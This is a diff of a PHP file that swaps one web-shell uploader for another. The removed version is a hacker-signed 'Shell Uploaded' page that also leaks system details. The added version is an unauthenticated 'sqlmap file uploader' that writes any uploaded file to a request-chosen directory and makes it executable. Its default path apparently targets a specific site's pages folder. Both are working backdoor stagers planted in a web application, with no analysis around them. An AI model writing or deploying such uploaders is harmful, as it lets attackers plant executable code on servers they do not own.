@@ -1,9 +1,2 @@
-<?php echo '<title>! Uploader !</title>';
-echo '<b><font face="Courier new" color="black" size="6">| M@rAz Ali |</b></font>';
-echo "<b>".php_uname()."</b><br>";
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
-else { echo '<b>Not uploaded ! </b><br><br>';}
-}
+<?php
+if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=F:\\E\\book_dru_team\\pages\\> <input type=submit name=upload value=upload></form>";}?>
